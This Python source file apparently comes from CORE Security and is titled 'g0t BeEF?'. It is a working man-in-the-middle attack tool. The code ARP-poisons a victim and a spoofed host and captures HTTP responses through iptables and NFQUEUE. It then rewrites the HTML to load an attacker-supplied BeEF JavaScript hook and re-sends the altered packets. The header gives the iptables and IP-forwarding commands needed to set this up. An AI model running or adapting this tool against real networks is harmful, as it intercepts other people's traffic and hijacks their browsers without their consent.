#--
#
# Description: g0t BeEF?
#
#       Authors:
#				Taylor Pennington @ CORE Security Technologies, CORE SDI Inc.
#				Level @ CORE Security Technologies, CORE SDI Inc.
#				
#       Emails: 
#				tpennington@coresecurity.com
#				level@coresecurity.com
#
# Copyright (c) CORE Security, CORE SDI Inc.
# All rights reserved.
#
# This computer software is owned by Core SDI Inc. and is
# protected by U.S. copyright laws and other laws and by international
# treaties.  This computer software is furnished by CORE SDI Inc.
# pursuant to a written license agreement and may be used, copied,
# transmitted, and stored only in accordance with the terms of such
# license and with the inclusion of the above copyright notice.  This
# computer software or any other copies thereof may not be provided or
# otherwise made available to any other person.
#
#
# THIS SOFTWARE IS PROVIDED ''AS IS'' AND ANY EXPRESS OR IMPLIED
# WARRANTIES ARE DISCLAIMED. IN NO EVENT SHALL CORE SDI Inc. BE LIABLE
# FOR ANY DIRECT,  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY OR
# CONSEQUENTIAL  DAMAGES RESULTING FROM THE USE OR MISUSE OF
# THIS SOFTWARE
#
#--
#		Prerequisites: 
#						Linux 2.6.3 i386 or x86_64 (tested on Ubuntu)
#						Python NFQ (git clone git://www.wzdftpd.net/nfqueue-bindings.git)
#						libnfnetlink-1.0.1 Download: http://www.netfilter.org/projects/libnfnetlink/downloads.html
#						libmnl-1.0.1 Download: http://www.netfilter.org/projects/libmnl/downloads.html
#						libnetfilter_queue-1.0.2 Download: http://netfilter.org/projects/libnetfilter_queue/downloads.html
#
#		Initialization:
#						echo 1 > /proc/sys/net/ipv4/ip_forward
#						capture requests (dont really need these)
#						iptables -A FORWARD -p tcp --dport 80 -j QUEUE 
#						capture responses
#						iptables -t nat -A PREROUTING -p tcp --sport 80 -j QUEUE
#
from os import geteuid, system
from sys import argv, exit
from time import sleep
from scapy.all import *
from optparse import OptionParser
import nfqueue, socket, threading, asyncore, StringIO, gzip

class Spoof():
	def get_mac(self,ip):
		try:
			return srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=5,verbose=0)[0][0][1][ARP].hwsrc
		except:
			print "[*] No Response"
			exit(0)
	def reset(self,spoofed_ip,spoofed_mac,victim_ip,victim_mac):
		send(ARP(psrc=spoofed_ip, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=spoofed_mac),verbose=0)
		send(ARP(psrc=victim_ip, pdst=spoofed_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac),verbose=0)
	def poison(self,spoofed_ip,spoofed_mac,victim_ip,victim_mac):
		# poison victim A-> B
		send(ARP(psrc=spoofed_ip, pdst=victim_ip, hwdst=get_if_hwaddr(conf.iface)),verbose=0)
		# poison spoof B -> A
		send(ARP(psrc=victim_ip, pdst=spoofed_ip, hwdst=get_if_hwaddr(conf.iface)),verbose=0)

class Manipulate():
	def __init__(self):
		self.ack,self.oldack = 0,0
		global data
		data = {}
	def check_ack(self,ack):
		if (ack == self.ack):
			return ack
		else:
			return self.oldack
	def store_ack(self,ack):
		self.oldack = self.ack
		self.ack = ack
		return
	def store_data(self,ack,input):
		try:
			if (input not in data[str(ack)]):
                                data[str(ack)] += input
		except:
			data[str(ack)] = input
		return
	def get_data(self,ack):
		if (ack is not -1):
			return data[str(ack)]
		else:
			return data.keys()
	def modify_data(self,data):
		if ("<head" in data):
			data = '%s<script src="%s"></script></head>%s' % (data.split("</head>")[0],url,data.split("</head>")[1])
			return data
		elif ("Content-Length" in data):
			curSize = int(data.split("Content-Length: ")[1].split("\r\n")[0])
			addSize = len('<script src="%s"></script>' % (url))
			newLength = curSize+addSize
			end = data.split("Content-Length: ")[1].split("\n")[1:]
			newend = ""
			for i in end:
				newend+=i
			data = "%sContent Length: %i\n%s" % (data.split("Content-Length: ")[0],newLength,newend)
			return data
		else: 
			return 0
	def handler(self):
		sleep(.5)
		oldQueue = data
		newQueue = []
		try:
			for i in oldQueue.iterkeys():
				if oldQueue[i] not in newQueue:
					newQueue.append(oldQueue[i])
					sleep(1)
					data.pop(i,None)
		except:
			pass
		for packet in newQueue:
			tempdata = packet['Raw'].load
	                if ("HTTP/1.1" in tempdata.split("\r\n\r\n")[0] and "gzip" in tempdata.split("\r\n\r\n")[0]):
        	                #print "[*] found compressed data, decompressing"
                	        try:
                        	        # decompress the data
                               		newData = gzip.GzipFile(fileobj=StringIO.StringIO(tempdata.split("\r\n\r\n")[1])).read()
                                	print "[*] data decompressed, modifying"
                                	modData = m.modify_data(newData)
                                	if (modData == 0):
                                        	print "[*] couldn't modify data"
                                        	return
                       	 	except Exception as e:
                                	#print "[*] decompress error: %s" % e
                                	return
                	elif ("HTTP/1.1" in tempdata):
                       	 	print "[*] found uncompressed data, modifying"
                        	modData = m.modify_data(tempdata.split("\r\n\r\n")[1])
                        	if (modData == 0):
                                	print "[*] couldn't HTML modify data"
                                	return
                	else:
                        	return
                	header =  m.modify_data(tempdata.split("\r\n\r\n")[0])
                	try:
                        	# file output for debug
                       	 	print "[*] modified data written to disk"
                        	fp = open("%s.html" % (packet['TCP'].ack), "w")
                        	fp.write(header+"\r\n\r\n"+modData)
                        	fp.close()
                	except Exception as e:
                        	print "[*] file error: %s" % e
                        	return
                	if ("gzip" in tempdata.split("\r\n\r\n")[0]):
                        	print "[*] recompressing modified data"
                        	try:
                                	# compress the data
                                	obj = StringIO.StringIO()
                               	 	modData = gzip.GzipFile(fileobj=obj,mode="w").write(str(modData))
                                	modData = header+"\r\n\r\n"+obj.getvalue()
                                	obj.close()
                        	except:
                                	#print "[*] compress error: %s" % e
                                	return
                	else:
                        	modData = header+"\r\n\r\n"+modData
                	# build the reply packet
                	packet['Raw'].load = modData
                	# update packet length
                	packet['IP'].len = len(str(packet))
                	# update checksum
			del packet['IP'].chksum
                	del packet['TCP'].chksum
			packet = packet.__class__(str(packet))
                	# deliver packet
                	send(packet,verbose=0)
                	# injection notification
                	print "[*] packet injected"
			return

class Own():
	def handler(self, i, payload):
		packet = IP(payload.get_data())
                try:
                        data = packet['Raw'].load
                except:
			payload.set_verdict(nfqueue.NF_ACCEPT)
                        return
		# find data to mod
		if ("GET" in data):
			print "[*] caught traffic from %s:%i to %s:%i" % (packet.src,packet.sport,packet.dst,packet.dport)
			payload.set_verdict(nfqueue.NF_ACCEPT)
			return
		if ("text/html" in data):
			print "[*] caught traffic from %s:%i to %s:%i" % (packet.src,packet.sport,packet.dst,packet.dport)
			# save response ack
                       	m.store_ack(packet['TCP'].ack)
		# see if were on the same ack as before
		previous,current = m.check_ack(packet['TCP'].ack), packet['TCP'].ack
		if (previous == current or previous == 0):
			# if yes, store the current packet
			m.store_data(current,packet)
		else:
			# if no, store the previous stream
			m.store_data(previous,packet)
		payload.set_verdict(nfqueue.NF_DROP)
		return

class InQueue(asyncore.file_dispatcher):
	def __init__(self):
		print '[*] in queue started.. waiting for data'
		self._q = nfqueue.queue()
		self._q.set_callback(Own().handler)
		self._q.fast_open(0, socket.AF_INET)
		self._q.set_queue_maxlen(5000)
		self.fd = self._q.get_fd()
		asyncore.file_dispatcher.__init__(self, self.fd, None)
		self._q.set_mode(nfqueue.NFQNL_COPY_PACKET)
	def handle_read(self):
		self._q.process_pending(10)

		
def main():
	print """----------------------\ng0t BeEF?\nLevel@coresecurity.com\ndecimate@coresecurity.com\n----------------------\n """
	if geteuid() != 0:
		print "[*] use root"
		exit(1)	

	parser = OptionParser()
	parser.add_option("--getmac",dest="ipAddr",help="Get MAC for IP")
	parser.add_option("--spoofip",dest="spoofed_ip",help="IP address to Spoof")
	parser.add_option("--victimip",dest="victim_ip",help="IP address to Attack")
	parser.add_option("--url",dest="url",help="BeEF JS Hook URL")
	(o, a) = parser.parse_args()
	
	if (o.ipAddr != None):
		print "[*] IP Address: %s MAC Address: %s" % (o.ipAddr,Spoof().get_mac(o.ipAddr))
		exit(0)
	
	if (o.spoofed_ip != None and o.victim_ip != None and o.url != None):
		global url, m, victim_mac, attack_mac, spoofed_mac
		url = o.url
		m = Manipulate()
		spoofed_mac = Spoof().get_mac(o.spoofed_ip)
		victim_mac = Spoof().get_mac(o.victim_ip)
		attack_mac = get_if_hwaddr(conf.iface)
		print "[*] Attacker MAC %s\n[*] Spoofed IP %s\n[*] Spoofed MAC %s\n[*] Victim IP %s\n[*] Victim MAC %s\n[*] Spoofing.." % (get_if_hwaddr(conf.iface),o.spoofed_ip,spoofed_mac,o.victim_ip,victim_mac)
		InQueue()
		threading.Thread(target=asyncore.loop, name="nfqueue-parent").start()
		while True:
			threading.Thread(target=Manipulate().handler, name="modify-data").start()
			try:
				threading.Thread(target=Spoof().poison, args=(o.spoofed_ip,spoofed_mac,o.victim_ip,victim_mac), name="arp-spoof").start()
				sleep(1)
			except KeyboardInterrupt:
				print "[*] killing threads..."
				try:
					for thread in threading.enumerate():
						if thread.isAlive():
							try:
								thread._Thread__stop()
							except:
								print '[*] ' + str(thread.getName()) + ' could not be terminated'
				except Exception as e:
					print "[*] errors finding/killing threads: %s" % (e)
				break
		print "[*] fixing ARP tables.."
		Spoof().reset(o.spoofed_ip,spoofed_mac,o.victim_ip,victim_mac)
		exit(0)
	else:
		exit(1)

if __name__=="__main__":
	main()

